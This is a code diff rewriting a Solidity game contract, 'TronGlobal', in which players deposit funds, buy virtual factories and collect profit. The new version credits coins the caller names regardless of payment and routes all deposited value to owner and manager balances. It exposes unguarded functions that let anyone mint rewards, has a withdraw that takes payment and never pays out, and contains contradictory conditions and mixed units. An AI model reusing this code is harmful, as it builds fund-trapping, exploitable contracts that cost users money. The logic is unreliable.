@@ -1,4 +1,4 @@
-pragma solidity ^0.4.23;
+pragma solidity ^0.5.0;
 
 library SafeMath {
 
@@ -37,147 +37,178 @@ library SafeMath {
 }
 
 contract TronGlobal {
-
+    
     using SafeMath for uint256;
-
-
-    uint constant COIN_PRICE = 40000;
+    
     uint constant TYPES_FACTORIES = 7;
     uint constant PERIOD = 60 minutes;
-
     uint[TYPES_FACTORIES] prices = [3750, 17625, 66750, 232500, 705000, 1455000,2500000];
     uint[TYPES_FACTORIES] profit = [5, 24, 95, 336, 1038, 2183, 868];
-
-    uint public totalPlayers;
-    uint public totalFactories;
-    uint public totalPayout;
-    uint public dividendPerToken;
-    uint256 public Admin_dividend;
-    uint256 public dividends;
-
     address owner;
     address manager;
-
+    
     struct Player {
-        uint coinsForBuy;
-        uint coinsForSale;
-        uint treasury;
-        uint time;
-        uint dividentrelease;
-        uint volatileholding;
-        uint[TYPES_FACTORIES] factories;
+        uint Treasurycoins;
+        uint Sparecoins;
+        uint volatilepoints;
+        uint typeoffac;
+        uint factories;
+        uint countof;
+        uint bank;
     }
-
+    
+    struct Deposit {
+        uint totalamount;
+        uint amount;
+        uint count;
+    }
+    
+        struct Withdraw {
+        uint totalamount;
+        uint amount;
+        uint count;
+    }
+    
+    uint deposit_count;
+    uint withdraw_count;
+    address[] usercount;
+    uint totalfactories;
+    uint256 public volatile;
     mapping(address => Player) public players;
-    mapping(address => uint) public map;
+    mapping(address => mapping(uint=>Player)) fac_count; 
+    mapping(address => uint) public balance;
+    mapping(address => uint) public numberof_fac;
+    mapping(address => mapping(uint => Deposit)) public deposit_history;
+    mapping(address => mapping(uint => Withdraw)) public withdraw_history;
+    mapping(uint => uint) public divident;
+    mapping(address => uint) public numberof_volatile;
+    
 
     constructor(address _owner, address _manager) public {
         owner = _owner;
         manager = _manager;
     }
     
-
-    function deposit() public payable {
-        require(msg.value >= COIN_PRICE);
-
-        Player storage player = players[msg.sender];
-        player.coinsForBuy = player.coinsForBuy.add(msg.value.div(COIN_PRICE));
-              
-        if (player.time == 0) {
-            player.time = now;
-            totalPlayers++;
-        }
+    function balanceOf(address _add) public view returns(uint){
+        return balance[_add];
     }
 
-
-    ///@param _type : 1 to 7 type of factory
-    ///@param _number : number of factory gonna buy
-    function buy(uint _type, uint _number) public {
+    function deposit(address _add,uint coins) public payable returns(bool){
+        require(address(_add)!=address(0));
+        
+        Player storage player = players[msg.sender];
+        balance[owner] = balance[owner].add(msg.value.mul(10).div(100));
+        balance[manager] = balance[manager].add(msg.value.mul(90).div(100));
+        player.Treasurycoins = player.Treasurycoins.add(coins);
+        deposit_history[_add][deposit_count].count+=1;
+        deposit_history[_add][deposit_count].amount=coins;
+        deposit_history[_add][deposit_count].totalamount+=deposit_history[_add][deposit_count].amount;
+        usercount.push(_add);
+        deposit_count++;
+        return true;
+    }
+    
+    function buy(address _add, uint _type, uint _number,uint _volatile) public returns(bool) {
+        require(address(_add)!=address(0));
         require(_type < TYPES_FACTORIES && _number > 0);
-        collect(msg.sender);
-        //Total house buy
-        uint paymentCoins = prices[_type].mul(_number);
+        
         Player storage player = players[msg.sender];
-
-        require(paymentCoins <= player.coinsForBuy.add(player.coinsForSale));
-
-        if (paymentCoins <= player.coinsForBuy) {
-            player.coinsForBuy = player.coinsForBuy.sub(paymentCoins);
-        } else {
-            player.coinsForSale = player.coinsForSale.add(player.coinsForBuy).sub(paymentCoins);
-            player.coinsForBuy = 0;
-        }
-
-        player.factories[_type] = player.factories[_type].add(_number);
-        
-        players[owner].coinsForSale = players[owner].coinsForSale.add( paymentCoins.mul(43335).div(100000));
-        players[owner].treasury = players[owner].treasury.add( paymentCoins.mul(43335).div(100000));
-        players[owner].dividentrelease = players[owner].dividentrelease.add(paymentCoins.mul(333).div(10000));  ///divi
-        players[manager].coinsForSale = players[manager].coinsForSale.add( paymentCoins.mul(10).div(100)); ///admin
-        
-        totalFactories = totalFactories.add(_number);
-        owner.transfer(Admin_dividend);
-
-    }
-    
-    ///@param _volatile : volatile point to be added to the owner
-    function volatile(uint _volatile) public returns(bool){
-        players[owner].volatileholding=players[owner].volatileholding+_volatile;
+        require(player.Treasurycoins>=prices[_type]);
+        player.Treasurycoins-= prices[_type];
+        fac_count[_add][_type].factories= _type;
+        fac_count[_add][_type].countof+=_number;
+        fac_count[_add][_type].volatilepoints+= _volatile;
+        numberof_fac[_add]+=_number;
+        numberof_volatile[_add]+=_volatile;
+        divident[_type]+=_volatile;
+        totalfactories  += _number;
         return true;
     }
     
-    ///@param _addr : address of user to add divident _amount
-    ///@param _amount : divident amount to be added for above user
-    function divident(address _addr,uint _amount) public returns(bool) {
-        _addr.transfer(_amount);
+    function collect(address _add,uint _type) public  returns(bool){
+        require(address(_add)!=address(0));
+        
+        uint Profit = profit[_type];
+        
+        players[_add].Treasurycoins = players[_add].Treasurycoins.add(Profit.div(2));
+        players[_add].Sparecoins = players[_add].Sparecoins.add(Profit.div(2));
+        return true; 
+    }
+    
+    function banktotreasury(address _add) public returns(bool){
+        players[_add].Treasurycoins+=players[_add].bank;
+        players[_add].bank=0;
         return true;
     }
     
-
-    /// @param _coins : coins to be withdraw from spare 
-    function withdraw(uint _coins) public {
-        require(_coins > 0);
-        collect(msg.sender);
-        require(_coins <= players[msg.sender].coinsForSale);
-
-        players[msg.sender].coinsForSale = players[msg.sender].coinsForSale.sub(_coins);
-        transfer(msg.sender, _coins.mul(COIN_PRICE));
+    
+    function withdraw(address _add,uint _towithdraw) public payable returns(bool){
+        require(players[_add].Sparecoins>=25);
+        uint value = _towithdraw.div(25);
+        require(value==msg.value);
+        players[_add].Sparecoins-=_towithdraw;
+        balance[_add]+=msg.value;
+        withdraw_history[_add][withdraw_count].count+=1;
+        withdraw_history[_add][withdraw_count].amount=_towithdraw;
+        withdraw_history[_add][withdraw_count].totalamount+=withdraw_history[_add][withdraw_count].amount;
+        withdraw_count++;
     }
-
-    ///@param _addr : address of user to receive timely profit
-    function collect(address _addr) internal {
-        Player storage player = players[_addr];
-        require(player.time > 0);
-
-        uint hoursPassed = ( now.sub(player.time) ).div(PERIOD);
-        if (hoursPassed > 0) {
-            uint hourlyProfit;
-            for (uint i = 0; i < TYPES_FACTORIES; i++) {
-                hourlyProfit = hourlyProfit.add( player.factories[i].mul(profit[i]) );
-            }
-            uint collectCoins = hoursPassed.mul(hourlyProfit);
-            player.coinsForBuy = player.coinsForBuy.add( collectCoins.div(2) );
-            player.coinsForSale = player.coinsForSale.add( collectCoins.div(2) );
-            player.time = player.time.add( hoursPassed.mul(PERIOD) );
-        }
-
+    
+    
+    function dividentPoints(address _add,uint _type,uint _newdeposit) public returns(bool){      //divide the result by 100
+        uint256 volatil = ((fac_count[_add][_type].countof).mul(_newdeposit)).mul(uint256(333).mul((fac_count[_add][_type].volatilepoints).div(divident[_type])));
+        players[_add].bank+=volatil.div(100);
+        return true;
     }
-
-    ///@param _receiver : Receiver address
-    ///@param _amount : teansfer amount
-    function transfer(address _receiver, uint _amount) internal {
-        if (_amount > 0 && _receiver != address(0)) {
-            uint contractBalance = address(this).balance;
-            if (contractBalance > 0) {
-                uint payout = _amount > contractBalance ? contractBalance : _amount;
-                totalPayout = totalPayout.add(payout);
-                msg.sender.transfer(payout);
-            }
+    
+    
+    function dailyprize(address _add) public payable returns(bool){
+        if(msg.value>5000 ether && msg.value<25000 ether){
+            players[_add].Treasurycoins += 4000;
+            return true;
+        }else if(msg.value>25000 ether && msg.value<50000){
+            players[_add].Treasurycoins += 15000;
+            return true;
+        }else if(msg.value>50000 ether && msg.value<100000){
+            players[_add].Treasurycoins += 30000;
+            return true;
+        }else if(msg.value>100000){
+            players[_add].Treasurycoins += 60000;
+            return true;
         }
     }
-
-    function factoriesOf(address _addr) public view returns (uint[TYPES_FACTORIES]) {
-        return players[_addr].factories;
+    
+    function timetask(address _add,uint _type) public returns(bool){
+        if(numberof_fac[_add]>400&&numberof_volatile[_add]>25000&&fac_count[_add][_type].factories==6 && fac_count[_add][_type].countof==3&& fac_count[_add][_type].countof==1){
+            players[_add].Treasurycoins+=1455000;
+            return true;
+        }else if(numberof_fac[_add]>100 && numberof_fac[_add]<400){
+            players[_add].Treasurycoins+=13000;
+            return true;
+        }else if(numberof_fac[_add]>400){
+            players[_add].Treasurycoins+=55000;
+            return true;
+        }else if(fac_count[_add][_type].factories==6 && fac_count[_add][_type].countof==1){
+            players[_add].Treasurycoins+=75000;
+            return true;
+        }else if(numberof_volatile[_add]>1000 && numberof_volatile[_add]<25000){
+            players[_add].Treasurycoins+=100000;
+            return true;
+        }else if(numberof_volatile[_add]>25000){
+            players[_add].Treasurycoins+=300000;
+            return true;
+        }else if(fac_count[_add][_type].factories==6 && fac_count[_add][_type].countof==3){
+            players[_add].Treasurycoins+=250000;
+            return true;
+        }else{
+            return false;
+        }
     }
-
+    
+    function totalfac(address _add) public view returns(uint){
+        require(address(_add)!=address(0));
+        return numberof_fac[_add];
+    }
+    
+    
 }
